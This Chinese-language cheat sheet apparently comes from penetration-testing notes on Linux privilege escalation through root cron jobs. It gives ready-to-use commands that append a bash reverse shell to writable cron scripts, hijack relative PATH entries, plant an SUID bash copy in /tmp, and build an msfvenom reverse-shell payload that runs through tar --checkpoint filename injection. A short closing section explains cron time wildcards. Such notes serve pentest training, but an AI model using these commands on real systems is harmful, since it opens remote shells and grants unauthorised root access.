## 文件权限

root权限自动任务脚本可写，写入反弹shell

```bash
cat /etc/crontab
# root /path/file writable
echo 'bash -i >& /dev/tcp/<host>/1234 0>&1' >> /file
```

## PATH环境变量

root权限自动任务存在，路径为相对地址，PATH中存在可写文件夹，在其中编写同名自动任务文件

- 写入反弹shell

```bash
echo '#!/bin/bash' > OnePATH/file
echo 'bash -i >& /dev/tcp/<host>/1234 0>&1' >> OnePATH/file
```

- 写入提权代码

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```bash
/tmp/rootbash -p # -p: priviledged, run as suid
```

## tar命令—checkpoint机制

root权限自动任务脚本存在，脚本中存在tar命令，使用tar命令的—checkpoint机制执行反弹shell。

**原理：**

在 Linux 的 `tar` 命令中，`--checkpoint` 选项用于在读取或写入每 n 条记录时设置检查点。默认情况下，n 的值为 10。检查点允许我们定期执行任意操作。
这些操作包括暂停、显示文本消息以及执行任意外部程序。这些操作是通过 `--checkpoint-action` 选项定义的。

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<host> LPORT=<port> -f elf -o shell.elf
# /path/to/rshell = path of running tar cmd
touch /path/to/rshell--checkpoint=1
touch /path/to/rshell--checkpoint-action=exec=shell.elf
```

---

## 自动任务时间中的通配符

格式

```bash
m h dom mon dow
```

在自动任务中，通配符用于表示一组值。以下是一些常见的通配符及其含义：

- *：表示任何可能的值。例如，在 cron 表达式中，如果在“小时”字段中使用 *，则表示“每个小时”。
- ?：表示不指定值。这在某些字段（如 cron 表达式的“日”和“周”字段）中很有用，当你想忽略这个字段时，可以使用 ?。
- -：表示一个范围。例如，在 cron 表达式中，1-5 表示“从 1 到 5”。
- ,：用于指定多个值。例如，在 cron 表达式中，1,3,5 表示“1、3 和 5”。
- /：用于指定间隔值。例如，在 cron 表达式中，*/5 表示“每 5 个单位”。